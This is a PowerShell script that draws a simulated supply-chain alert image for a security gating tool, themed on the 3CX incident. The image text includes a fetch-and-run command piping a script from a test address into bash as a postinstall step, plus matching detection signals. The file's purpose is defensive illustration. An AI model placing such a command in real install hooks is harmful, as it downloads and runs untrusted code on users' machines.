param(
    [string]$OutputPath = (Join-Path $PSScriptRoot "3cx-danger-evidence.png")
)

Add-Type -AssemblyName System.Drawing

$width = 1600
$height = 900
$bitmap = New-Object System.Drawing.Bitmap($width, $height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
$graphics.TextRenderingHint = [System.Drawing.Text.TextRenderingHint]::ClearTypeGridFit
$graphics.CompositingQuality = [System.Drawing.Drawing2D.CompositingQuality]::HighQuality

function Get-Color {
    param([string]$Hex)
    return [System.Drawing.ColorTranslator]::FromHtml($Hex)
}

function New-Brush {
    param([string]$Hex)
    return New-Object System.Drawing.SolidBrush((Get-Color $Hex))
}

function New-Font {
    param(
        [string]$Family,
        [single]$Size,
        [System.Drawing.FontStyle]$Style = [System.Drawing.FontStyle]::Regular
    )
    return New-Object System.Drawing.Font($Family, $Size, $Style, [System.Drawing.GraphicsUnit]::Pixel)
}

function Draw-Text {
    param(
        [string]$Text,
        [single]$X,
        [single]$Y,
        [single]$Size,
        [string]$Color,
        [string]$Family = "Segoe UI",
        [System.Drawing.FontStyle]$Style = [System.Drawing.FontStyle]::Regular
    )

    $font = New-Font -Family $Family -Size $Size -Style $Style
    $brush = New-Brush -Hex $Color
    try {
        $graphics.DrawString($Text, $font, $brush, $X, $Y)
    }
    finally {
        $font.Dispose()
        $brush.Dispose()
    }
}

function Fill-Box {
    param(
        [single]$X,
        [single]$Y,
        [single]$Width,
        [single]$Height,
        [string]$Color
    )

    $brush = New-Brush -Hex $Color
    try {
        $graphics.FillRectangle($brush, $X, $Y, $Width, $Height)
    }
    finally {
        $brush.Dispose()
    }
}

function Draw-Line {
    param(
        [single]$X1,
        [single]$Y1,
        [single]$X2,
        [single]$Y2,
        [string]$Color,
        [single]$Width = 1
    )

    $pen = New-Object System.Drawing.Pen((Get-Color $Color), $Width)
    try {
        $graphics.DrawLine($pen, $X1, $Y1, $X2, $Y2)
    }
    finally {
        $pen.Dispose()
    }
}

try {
    $graphics.Clear((Get-Color "#0B0F14"))

    Fill-Box 0 0 1600 72 "#121821"
    Fill-Box 0 72 8 828 "#E5484D"
    Draw-Text "SUPPLYGUARD / 3CX CASE" 42 22 22 "#F3F6FA" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "DEFENSIVE REPLAY" 1320 24 18 "#8B96A5" "Consolas" ([System.Drawing.FontStyle]::Bold)

    Draw-Text "SUPPLY CHAIN ALERT" 48 100 40 "#FFFFFF" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "3CX DESKTOP APP" 50 149 21 "#A7B0BD" "Consolas" ([System.Drawing.FontStyle]::Bold)
    Fill-Box 1324 100 228 54 "#B4232A"
    Draw-Text "CRITICAL" 1367 112 25 "#FFFFFF" "Segoe UI" ([System.Drawing.FontStyle]::Bold)

    Fill-Box 48 194 1046 642 "#121821"
    Fill-Box 1120 194 432 642 "#121821"
    Fill-Box 48 194 1046 5 "#E5484D"
    Fill-Box 1120 194 432 5 "#E5484D"

    Draw-Text "INCIDENT EVIDENCE" 78 226 19 "#8B96A5" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Line 78 266 1064 266 "#2B3440" 1

    Draw-Text "Package" 78 291 17 "#7F8A99" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "x-trader-codec" 252 286 27 "#F3F6FA" "Consolas" ([System.Drawing.FontStyle]::Bold)

    Draw-Text "Stage" 78 347 17 "#7F8A99" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Fill-Box 246 337 224 43 "#3D1720"
    Draw-Text "postinstall" 264 343 25 "#FF8C91" "Consolas" ([System.Drawing.FontStyle]::Bold)

    Draw-Text "Command" 78 409 17 "#7F8A99" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Fill-Box 78 442 986 76 "#080B10"
    Fill-Box 78 442 6 76 "#E5484D"
    Draw-Text "curl http://198.51.100.23/update.sh | bash" 106 462 26 "#FFFFFF" "Consolas" ([System.Drawing.FontStyle]::Bold)

    Draw-Text "Network" 78 549 17 "#7F8A99" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "abnormal egress to" 252 544 23 "#F3F6FA" "Consolas"
    Draw-Text "198.51.100.23" 536 544 25 "#FF8C91" "Consolas" ([System.Drawing.FontStyle]::Bold)

    Draw-Text "Host" 78 602 17 "#7F8A99" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "build-runner-01" 252 597 23 "#F3F6FA" "Consolas"
    Draw-Text "Process" 620 602 17 "#7F8A99" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "3cx-desktop-app" 744 597 23 "#F3F6FA" "Consolas"

    Draw-Text "Artifact" 78 655 17 "#7F8A99" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "3cx-desktop-app.tar.gz" 252 650 23 "#F3F6FA" "Consolas"

    Draw-Text "Finding" 78 708 17 "#7F8A99" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "artifact digest mismatch" 252 703 23 "#FFB86B" "Consolas" ([System.Drawing.FontStyle]::Bold)

    Fill-Box 78 769 986 1 "#2B3440"
    Draw-Text "Risk chain: package install -> external download -> release artifact" 78 789 17 "#8B96A5" "Consolas"

    Draw-Text "GATE DECISION" 1150 226 19 "#8B96A5" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Line 1150 266 1522 266 "#2B3440" 1
    Draw-Text "BLOCK" 1150 297 55 "#FF5D62" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "RELEASE" 1152 359 35 "#FFFFFF" "Segoe UI" ([System.Drawing.FontStyle]::Bold)

    Fill-Box 1150 431 372 1 "#2B3440"
    Draw-Text "MATCHED SIGNALS" 1150 458 18 "#8B96A5" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "01  postinstall" 1150 499 24 "#FFFFFF" "Consolas" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "02  curl" 1150 543 24 "#FFFFFF" "Consolas" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "03  198.51.100.23" 1150 587 24 "#FFFFFF" "Consolas" ([System.Drawing.FontStyle]::Bold)

    Fill-Box 1150 646 372 78 "#3D1720"
    Draw-Text "RULE" 1170 662 14 "#FF8C91" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "postinstall-egress" 1170 685 21 "#FFFFFF" "Consolas" ([System.Drawing.FontStyle]::Bold)

    Draw-Text "Severity" 1150 756 15 "#7F8A99" "Segoe UI" ([System.Drawing.FontStyle]::Bold)
    Draw-Text "CRITICAL / 96" 1150 781 23 "#FF8C91" "Consolas" ([System.Drawing.FontStyle]::Bold)

    Draw-Text "SIMULATED EVIDENCE - TEST-NET ADDRESS - NO LIVE PAYLOAD" 48 861 15 "#687483" "Consolas" ([System.Drawing.FontStyle]::Bold)

    $outputDirectory = Split-Path -Parent $OutputPath
    if ($outputDirectory -and -not (Test-Path -LiteralPath $outputDirectory)) {
        New-Item -ItemType Directory -Force -Path $outputDirectory | Out-Null
    }

    $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
    Write-Output $OutputPath
}
finally {
    $graphics.Dispose()
    $bitmap.Dispose()
}
